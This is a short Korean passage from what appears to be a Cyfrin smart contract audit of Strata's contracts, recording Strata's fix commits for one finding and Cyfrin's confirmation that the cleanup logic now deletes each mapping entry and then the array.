**Strata:** 커밋 [fbb6818](https://github.com/Strata-Money/contracts/commit/fbb6818f5c1f621a25c58a40f1673609ad9611fb) 및 [98bd92d](https://github.com/Strata-Money/contracts/commit/98bd92d0aed75161332227239859c34161df1bcc)에서 수정됨.

**Cyfrin:** 확인함. 로직은 자산 주소를 반복하고 개별 매핑 항목을 삭제한 다음 마지막으로 배열을 삭제하여 단순화되었습니다.

